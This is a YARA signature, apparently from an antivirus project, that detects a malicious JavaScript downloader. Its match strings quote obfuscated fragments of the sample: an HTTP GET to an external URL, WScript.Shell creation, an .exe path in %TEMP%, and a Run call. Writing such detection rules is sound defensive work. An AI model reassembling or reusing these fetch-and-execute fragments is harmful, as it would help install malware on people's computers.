rule sig_20160401_56de8697236b383fc588e90ecc4421d2 {
  meta:
    description = "datamaliciousorder - file 20160401_56de8697236b383fc588e90ecc4421d2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "64bc64f8f07a9d12102a5ec3be77d6b6dd5def54c71fa5a99fd23f3444929b15"

  strings:
    $s1  = "PtwUr[PcHvy](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "function CmqRy(YqHgo, UqsVh){MfbRrl = MfbRrl * 1; return YqHgo - UqsVh;};" fullword ascii
    $s3  = "var RweHek = function DlqTfm() {return WScript[OaMin](\"WScript\"+\".Shell\");}(), KlkOna = 11;" fullword ascii
    $s4  = "if (PtwUr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TrkYso(){return VdTv + \"\";};" fullword ascii
    $s6  = "function VaWh() {return RweHek[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VwlrNZl7fyA7EUI.ex\" + \"e\";};" fullword ascii
    $s7  = "function BbeGp() {return ((SyiOn == true) && (SyiOn == XzAws)) ? 1 : MfbRrl;};" fullword ascii
    $s8  = "return CmqRy(YpxNz, WhpWw);" fullword ascii
    $s9  = "function UzFoh(RioIqv){RweHek[\"R\"+\"un\"](RioIqv, MfbRrl, MfbRrl);};" fullword ascii
    $s10 = "}while (UrXv);" fullword ascii
    $s11 = "XzAws = true; " fullword ascii
    $s12 = "function UgXw(){return OaMin;};" fullword ascii
    $s13 = "var XzAws = false;" fullword ascii
    $s14 = "var SyiOn = false;" fullword ascii
    $s15 = "var UznHsw = false;" fullword ascii
    $s16 = "SyiOn = true; " fullword ascii
    $s17 = "var EvYdz = new this[\"Date\"]();" fullword ascii
    $s18 = "function LqvJx()" fullword ascii
    $s19 = "function FoMzr(DruCjh) {var QimOf = (1, 2, 3, 4, 5, DruCjh); return QimOf;};" fullword ascii
    $s20 = "function YmiVgq(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}